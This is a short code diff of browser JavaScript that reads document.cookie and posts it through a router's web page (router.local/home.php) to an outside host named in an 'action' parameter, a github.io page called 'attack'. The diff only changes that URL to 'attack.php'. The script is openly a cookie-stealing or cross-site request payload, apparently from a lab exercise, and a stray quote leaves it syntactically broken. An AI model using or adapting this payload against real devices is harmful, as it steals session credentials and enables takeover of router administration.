@@ -1,7 +1,7 @@
 const http = new XMLHttpRequest();
 //http.open('POST', 'http://router.local/login.php', true);
 const cook = document.cookie;
-http.open('POST', 'http://router.local/home.php?action=https://nastassiagoodson.github.io/attack&'+cook', true);
+http.open('POST', 'http://router.local/home.php?action=https://nastassiagoodson.github.io/attack.php&'+cook', true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
